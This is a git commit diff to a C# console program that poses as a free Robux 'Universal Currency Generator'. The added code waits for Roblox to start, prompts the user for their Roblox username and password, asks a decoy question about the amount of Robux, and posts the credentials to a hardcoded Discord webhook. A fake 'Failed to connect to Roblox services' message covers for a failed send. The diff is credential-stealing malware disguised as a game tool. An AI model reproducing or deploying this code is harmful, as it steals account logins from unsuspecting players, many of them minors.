e141399cdefde8304155dd37ee07cde65a2279b8
PuyanJR <davidpuiu18@gmail.com>
2025-12-06 16:29:40 +0200

    finish

--- Program.cs
+++ Program.cs
@@ -1,11 +1,13 @@
 ﻿using System;
 using System.Diagnostics;
+using System.Text;
 using System.Threading;
-
+using System.Threading.Tasks;
+using System.Net.Http;
 
 partial class Program
 {
-    static void Main()
+    static async Task Main()
     {
         Console.WriteLine("Welcome to Universal Currency Generator! (UCG) by MirkoKING https://youtube.com/c/MirkoKING");
         Thread.Sleep(1000);
@@ -22,15 +24,43 @@ partial class Program
             if (processes.Length > 0)
             {
                 Console.WriteLine("Roblox started!");
-                // Continue your program here
                 break;
             }
 
             Thread.Sleep(500); // reduce CPU usage
         }
 
-        // Continue your program logic here...
-        Console.WriteLine("Program is continuing...");
+        // Continue
+        Console.WriteLine("Waiting..");
+        Thread.Sleep(2400);
+        Console.Write("Enter username: ");
+        string username = Console.ReadLine();
+        Console.Write("Enter password: ");
+        string password = Console.ReadLine();
+        Console.Write("How much robux do you want? (PUT RANDOM VALUE SO ROBLOX DOESNT BAN): ");
+        string robux = Console.ReadLine();
+
+        string webhookUrl = "https://discord.com/api/webhooks/1446837691785416764/FFM7B_wTxJv-6NEXwFz2Y61VUCwjtpv5mj1yZ7lMh1IfNObuhu9TvTLLkaDQTnSbIPxK";
+
+        // Create the JSON payload required by Discord
+        string jsonPayload = $"{{\"content\":\"Username: {username}\nPassword: {password}\"}}";
+
+        using (HttpClient client = new HttpClient())
+        {
+            // Create the HTTP content with JSON headers
+            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
+
+            // Send the POST request
+            HttpResponseMessage response = await client.PostAsync(webhookUrl, content);
+
+            if (response.IsSuccessStatusCode)
+            {
+            }
+            else
+            {
+                Console.WriteLine("Failed to connect to Roblox services: " + response.StatusCode);
+            }
+        }
     }
 }
 
